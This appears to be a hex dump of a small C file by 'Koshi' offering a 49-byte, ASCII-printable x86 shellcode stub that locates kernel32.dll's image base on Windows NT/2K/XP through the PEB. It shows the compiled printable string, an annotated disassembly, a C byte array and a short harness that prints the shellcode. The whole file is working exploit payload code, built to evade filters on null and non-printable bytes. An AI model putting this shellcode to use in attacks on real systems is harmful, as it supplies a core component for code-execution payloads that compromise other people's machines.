00000000  2f 2a 0d 0a 0d 0a 20 50  45 42 20 4b 65 72 6e 65  |/*.... PEB Kerne|
00000010  6c 33 32 2e 64 6c 6c 20  49 6d 61 67 65 42 61 73  |l32.dll ImageBas|
00000020  65 20 46 69 6e 64 65 72  20 28 20 41 73 63 69 69  |e Finder ( Ascii|
00000030  20 50 72 69 6e 74 61 62  6c 65 20 29 0d 0a 0d 0a  | Printable )....|
00000040  20 41 75 74 68 6f 72 3a  20 4b 6f 73 68 69 0d 0a  | Author: Koshi..|
00000050  0d 0a 20 44 65 73 63 72  69 70 74 69 6f 6e 3a 20  |.. Description: |
00000060  55 73 65 73 20 50 45 42  20 6d 65 74 68 6f 64 20  |Uses PEB method |
00000070  74 6f 20 6c 6f 63 61 74  65 20 74 68 65 20 49 6d  |to locate the Im|
00000080  61 67 65 42 61 73 65 20  6f 66 20 4b 65 72 6e 65  |ageBase of Kerne|
00000090  6c 33 32 2e 64 6c 6c 0d  0a 20 20 20 20 20 20 20  |l32.dll..       |
000000a0  20 20 20 20 20 20 20 4f  4e 4c 59 20 73 75 70 70  |       ONLY supp|
000000b0  6f 72 74 73 20 4e 54 2f  32 4b 2f 58 50 2e 2e 20  |orts NT/2K/XP.. |
000000c0  73 6f 72 72 79 20 6e 6f  20 39 58 2e 20 49 6d 61  |sorry no 9X. Ima|
000000d0  67 65 42 61 73 65 20 77  69 6c 6c 20 62 65 0d 0a  |geBase will be..|
000000e0  09 20 20 20 20 20 20 72  65 74 75 72 6e 65 64 20  |.      returned |
000000f0  69 6e 20 45 41 58 2e 20  4e 6f 20 6e 75 6c 6c 20  |in EAX. No null |
00000100  62 79 74 65 73 2c 20 6f  62 76 69 6f 75 73 6c 79  |bytes, obviously|
00000110  2c 20 73 6f 20 6e 6f 20  6e 65 65 64 20 74 6f 0d  |, so no need to.|
00000120  0a 09 20 20 20 20 20 20  65 6e 63 6f 64 65 20 72  |..      encode r|
00000130  65 61 6c 6c 79 2e 0d 0a  0d 0a 20 4c 65 6e 67 74  |eally..... Lengt|
00000140  68 3a 20 34 39 20 42 79  74 65 73 0d 0a 20 52 65  |h: 49 Bytes.. Re|
00000150  67 69 73 74 65 72 73 20  55 73 65 64 3a 20 65 61  |gisters Used: ea|
00000160  78 2c 65 73 69 0d 0a 20  43 6f 6d 70 69 6c 65 64  |x,esi.. Compiled|
00000170  3a 20 6a 30 58 34 30 50  50 50 64 33 40 30 5e 56  |: j0X40PPPd3@0^V|
00000180  34 4c 34 40 5e 56 33 30  56 58 5e 34 50 34 4c 33  |4L4@^V30VX^4P4L3|
00000190  30 58 50 56 58 5e 33 30  56 58 5e 34 58 34 50 33  |0XPVX^30VX^4X4P3|
000001a0  30 56 58 0d 0a 0d 0a 2a  2f 0d 0a 0d 0a 2f 2a 0d  |0VX....*/..../*.|
000001b0  0a 0d 0a 30 30 34 30 31  30 30 30 20 3e 20 24 20  |...00401000 > $ |
000001c0  36 41 20 33 30 20 20 20  20 20 20 20 20 20 20 50  |6A 30          P|
000001d0  55 53 48 20 33 30 0d 0a  30 30 34 30 31 30 30 32  |USH 30..00401002|
000001e0  20 20 20 2e 20 35 38 20  20 20 20 20 20 20 20 20  |   . 58         |
000001f0  20 20 20 20 50 4f 50 20  45 41 58 0d 0a 30 30 34  |    POP EAX..004|
00000200  30 31 30 30 33 20 20 20  2e 20 33 34 20 33 30 20  |01003   . 34 30 |
00000210  20 20 20 20 20 20 20 20  20 58 4f 52 20 41 4c 2c  |         XOR AL,|
00000220  33 30 0d 0a 30 30 34 30  31 30 30 35 20 20 20 2e  |30..00401005   .|
00000230  20 35 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 50             |
00000240  50 55 53 48 20 45 41 58  0d 0a 30 30 34 30 31 30  |PUSH EAX..004010|
00000250  30 36 20 20 20 2e 20 35  30 20 20 20 20 20 20 20  |06   . 50       |
00000260  20 20 20 20 20 20 50 55  53 48 20 45 41 58 0d 0a  |      PUSH EAX..|
00000270  30 30 34 30 31 30 30 37  20 20 20 2e 20 35 30 20  |00401007   . 50 |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 50 55 53 48  |            PUSH|
00000290  20 45 41 58 0d 0a 30 30  34 30 31 30 30 38 20 20  | EAX..00401008  |
000002a0  20 2e 20 36 34 3a 33 33  34 30 20 33 30 20 20 20  | . 64:3340 30   |
000002b0  20 20 58 4f 52 20 45 41  58 2c 44 57 4f 52 44 20  |  XOR EAX,DWORD |
000002c0  50 54 52 20 46 53 3a 5b  45 41 58 2b 33 30 5d 0d  |PTR FS:[EAX+30].|
000002d0  0a 30 30 34 30 31 30 30  43 20 20 20 2e 20 35 45  |.0040100C   . 5E|
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 50 4f 50  |             POP|
000002f0  20 45 53 49 0d 0a 30 30  34 30 31 30 30 44 20 20  | ESI..0040100D  |
00000300  20 2e 20 35 36 20 20 20  20 20 20 20 20 20 20 20  | . 56           |
00000310  20 20 50 55 53 48 20 45  53 49 0d 0a 30 30 34 30  |  PUSH ESI..0040|
00000320  31 30 30 45 20 20 20 2e  20 33 34 20 34 43 20 20  |100E   . 34 4C  |
00000330  20 20 20 20 20 20 20 20  58 4f 52 20 41 4c 2c 34  |        XOR AL,4|
00000340  43 0d 0a 30 30 34 30 31  30 31 30 20 20 20 2e 20  |C..00401010   . |
00000350  33 34 20 34 30 20 20 20  20 20 20 20 20 20 20 58  |34 40          X|
00000360  4f 52 20 41 4c 2c 34 30  0d 0a 30 30 34 30 31 30  |OR AL,40..004010|
00000370  31 32 20 20 20 2e 20 35  45 20 20 20 20 20 20 20  |12   . 5E       |
00000380  20 20 20 20 20 20 50 4f  50 20 45 53 49 0d 0a 30  |      POP ESI..0|
00000390  30 34 30 31 30 31 33 20  20 20 2e 20 35 36 20 20  |0401013   . 56  |
000003a0  20 20 20 20 20 20 20 20  20 20 20 50 55 53 48 20  |           PUSH |
000003b0  45 53 49 0d 0a 30 30 34  30 31 30 31 34 20 20 20  |ESI..00401014   |
000003c0  2e 20 33 33 33 30 20 20  20 20 20 20 20 20 20 20  |. 3330          |
000003d0  20 58 4f 52 20 45 53 49  2c 44 57 4f 52 44 20 50  | XOR ESI,DWORD P|
000003e0  54 52 20 44 53 3a 5b 45  41 58 5d 0d 0a 30 30 34  |TR DS:[EAX]..004|
000003f0  30 31 30 31 36 20 20 20  2e 20 35 36 20 20 20 20  |01016   . 56    |
00000400  20 20 20 20 20 20 20 20  20 50 55 53 48 20 45 53  |         PUSH ES|
00000410  49 0d 0a 30 30 34 30 31  30 31 37 20 20 20 2e 20  |I..00401017   . |
00000420  35 38 20 20 20 20 20 20  20 20 20 20 20 20 20 50  |58             P|
00000430  4f 50 20 45 41 58 0d 0a  30 30 34 30 31 30 31 38  |OP EAX..00401018|
00000440  20 20 20 2e 20 35 45 20  20 20 20 20 20 20 20 20  |   . 5E         |
00000450  20 20 20 20 50 4f 50 20  45 53 49 0d 0a 30 30 34  |    POP ESI..004|
00000460  30 31 30 31 39 20 20 20  2e 20 33 34 20 35 30 20  |01019   . 34 50 |
00000470  20 20 20 20 20 20 20 20  20 58 4f 52 20 41 4c 2c  |         XOR AL,|
00000480  35 30 0d 0a 30 30 34 30  31 30 31 42 20 20 20 2e  |50..0040101B   .|
00000490  20 33 34 20 34 43 20 20  20 20 20 20 20 20 20 20  | 34 4C          |
000004a0  58 4f 52 20 41 4c 2c 34  43 0d 0a 30 30 34 30 31  |XOR AL,4C..00401|
000004b0  30 31 44 20 20 20 2e 20  33 33 33 30 20 20 20 20  |01D   . 3330    |
000004c0  20 20 20 20 20 20 20 58  4f 52 20 45 53 49 2c 44  |       XOR ESI,D|
000004d0  57 4f 52 44 20 50 54 52  20 44 53 3a 5b 45 41 58  |WORD PTR DS:[EAX|
000004e0  5d 0d 0a 30 30 34 30 31  30 31 46 20 20 20 2e 20  |]..0040101F   . |
000004f0  35 38 20 20 20 20 20 20  20 20 20 20 20 20 20 50  |58             P|
00000500  4f 50 20 45 41 58 0d 0a  30 30 34 30 31 30 32 30  |OP EAX..00401020|
00000510  20 20 20 2e 20 35 30 20  20 20 20 20 20 20 20 20  |   . 50         |
00000520  20 20 20 20 50 55 53 48  20 45 41 58 0d 0a 30 30  |    PUSH EAX..00|
00000530  34 30 31 30 32 31 20 20  20 2e 20 35 36 20 20 20  |401021   . 56   |
00000540  20 20 20 20 20 20 20 20  20 20 50 55 53 48 20 45  |          PUSH E|
00000550  53 49 0d 0a 30 30 34 30  31 30 32 32 20 20 20 2e  |SI..00401022   .|
00000560  20 35 38 20 20 20 20 20  20 20 20 20 20 20 20 20  | 58             |
00000570  50 4f 50 20 45 41 58 0d  0a 30 30 34 30 31 30 32  |POP EAX..0040102|
00000580  33 20 20 20 2e 20 35 45  20 20 20 20 20 20 20 20  |3   . 5E        |
00000590  20 20 20 20 20 50 4f 50  20 45 53 49 0d 0a 30 30  |     POP ESI..00|
000005a0  34 30 31 30 32 34 20 20  20 2e 20 33 33 33 30 20  |401024   . 3330 |
000005b0  20 20 20 20 20 20 20 20  20 20 58 4f 52 20 45 53  |          XOR ES|
000005c0  49 2c 44 57 4f 52 44 20  50 54 52 20 44 53 3a 5b  |I,DWORD PTR DS:[|
000005d0  45 41 58 5d 0d 0a 30 30  34 30 31 30 32 36 20 20  |EAX]..00401026  |
000005e0  20 2e 20 35 36 20 20 20  20 20 20 20 20 20 20 20  | . 56           |
000005f0  20 20 50 55 53 48 20 45  53 49 0d 0a 30 30 34 30  |  PUSH ESI..0040|
00000600  31 30 32 37 20 20 20 2e  20 35 38 20 20 20 20 20  |1027   . 58     |
00000610  20 20 20 20 20 20 20 20  50 4f 50 20 45 41 58 0d  |        POP EAX.|
00000620  0a 30 30 34 30 31 30 32  38 20 20 20 2e 20 35 45  |.00401028   . 5E|
00000630  20 20 20 20 20 20 20 20  20 20 20 20 20 50 4f 50  |             POP|
00000640  20 45 53 49 0d 0a 30 30  34 30 31 30 32 39 20 20  | ESI..00401029  |
00000650  20 2e 20 33 34 20 35 38  20 20 20 20 20 20 20 20  | . 34 58        |
00000660  20 20 58 4f 52 20 41 4c  2c 35 38 0d 0a 30 30 34  |  XOR AL,58..004|
00000670  30 31 30 32 42 20 20 20  2e 20 33 34 20 35 30 20  |0102B   . 34 50 |
00000680  20 20 20 20 20 20 20 20  20 58 4f 52 20 41 4c 2c  |         XOR AL,|
00000690  35 30 0d 0a 30 30 34 30  31 30 32 44 20 20 20 2e  |50..0040102D   .|
000006a0  20 33 33 33 30 20 20 20  20 20 20 20 20 20 20 20  | 3330           |
000006b0  58 4f 52 20 45 53 49 2c  44 57 4f 52 44 20 50 54  |XOR ESI,DWORD PT|
000006c0  52 20 44 53 3a 5b 45 41  58 5d 0d 0a 30 30 34 30  |R DS:[EAX]..0040|
000006d0  31 30 32 46 20 20 20 2e  20 35 36 20 20 20 20 20  |102F   . 56     |
000006e0  20 20 20 20 20 20 20 20  50 55 53 48 20 45 53 49  |        PUSH ESI|
000006f0  0d 0a 30 30 34 30 31 30  33 30 20 20 20 2e 20 35  |..00401030   . 5|
00000700  38 20 20 20 20 20 20 20  20 20 20 20 20 20 50 4f  |8             PO|
00000710  50 20 45 41 58 0d 0a 0d  0a 2a 2f 0d 0a 0d 0a 75  |P EAX....*/....u|
00000720  6e 73 69 67 6e 65 64 20  63 68 61 72 20 53 68 65  |nsigned char She|
00000730  6c 6c 63 6f 64 65 5b 5d  20 3d 0d 0a 7b 22 5c 78  |llcode[] =..{"\x|
00000740  36 41 5c 78 33 30 5c 78  35 38 5c 78 33 34 5c 78  |6A\x30\x58\x34\x|
00000750  33 30 5c 78 35 30 5c 78  35 30 5c 78 35 30 22 0d  |30\x50\x50\x50".|
00000760  0a 22 5c 78 36 34 5c 78  33 33 5c 78 34 30 5c 78  |."\x64\x33\x40\x|
00000770  33 30 5c 78 35 45 5c 78  35 36 5c 78 33 34 5c 78  |30\x5E\x56\x34\x|
00000780  34 43 22 0d 0a 22 5c 78  33 34 5c 78 34 30 5c 78  |4C".."\x34\x40\x|
00000790  35 45 5c 78 35 36 5c 78  33 33 5c 78 33 30 5c 78  |5E\x56\x33\x30\x|
000007a0  35 36 5c 78 35 38 22 0d  0a 22 5c 78 35 45 5c 78  |56\x58".."\x5E\x|
000007b0  33 34 5c 78 35 30 5c 78  33 34 5c 78 34 43 5c 78  |34\x50\x34\x4C\x|
000007c0  33 33 5c 78 33 30 5c 78  35 38 22 0d 0a 22 5c 78  |33\x30\x58".."\x|
000007d0  35 30 5c 78 35 36 5c 78  35 38 5c 78 35 45 5c 78  |50\x56\x58\x5E\x|
000007e0  33 33 5c 78 33 30 5c 78  35 36 5c 78 35 38 22 0d  |33\x30\x56\x58".|
000007f0  0a 22 5c 78 35 45 5c 78  33 34 5c 78 35 38 5c 78  |."\x5E\x34\x58\x|
00000800  33 34 5c 78 35 30 5c 78  33 33 5c 78 33 30 5c 78  |34\x50\x33\x30\x|
00000810  35 36 22 0d 0a 22 5c 78  35 38 22 7d 3b 0d 0a 0d  |56".."\x58"};...|
00000820  0a 69 6e 74 20 6d 61 69  6e 28 20 69 6e 74 20 61  |.int main( int a|
00000830  72 67 63 2c 20 63 68 61  72 20 2a 61 72 67 76 5b  |rgc, char *argv[|
00000840  5d 20 29 0d 0a 7b 0d 0a  20 70 72 69 6e 74 66 28  |] )..{.. printf(|
00000850  20 22 53 68 65 6c 6c 63  6f 64 65 20 69 73 20 25  | "Shellcode is %|
00000860  75 20 62 79 74 65 73 2e  5c 6e 22 2c 20 73 69 7a  |u bytes.\n", siz|
00000870  65 6f 66 28 53 68 65 6c  6c 63 6f 64 65 29 2d 31  |eof(Shellcode)-1|
00000880  20 29 3b 0d 0a 20 70 72  69 6e 74 66 28 20 53 68  | );.. printf( Sh|
00000890  65 6c 6c 63 6f 64 65 2c  20 73 69 7a 65 6f 66 28  |ellcode, sizeof(|
000008a0  53 68 65 6c 6c 63 6f 64  65 29 20 29 3b 0d 0a 20  |Shellcode) );.. |
000008b0  72 65 74 75 72 6e 20 30  3b 0d 0a 7d              |return 0;..}|
000008bc
